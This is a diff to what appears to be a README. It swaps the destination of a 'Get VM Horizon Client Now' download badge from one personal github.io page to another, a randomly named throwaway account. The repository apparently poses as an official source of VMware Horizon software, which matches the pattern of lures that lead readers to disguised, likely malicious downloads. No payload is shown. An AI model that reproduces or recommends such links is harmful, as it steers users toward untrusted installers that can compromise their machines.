@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://docs.cyderes.cloud/img/vmware-horizon-logo.jpeg)
 
-[![Get VM Horizon Client Now](https://img.shields.io/badge/Get_VM_Horizon_Client-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/vm-horizon-client)
+[![Get VM Horizon Client Now](https://img.shields.io/badge/Get_VM_Horizon_Client-Now-0a5d8d?style=for-the-badge&logo=github)](https://cairohicksnqqo.github.io/.github/vm-horizon-client)
 
 ---
 
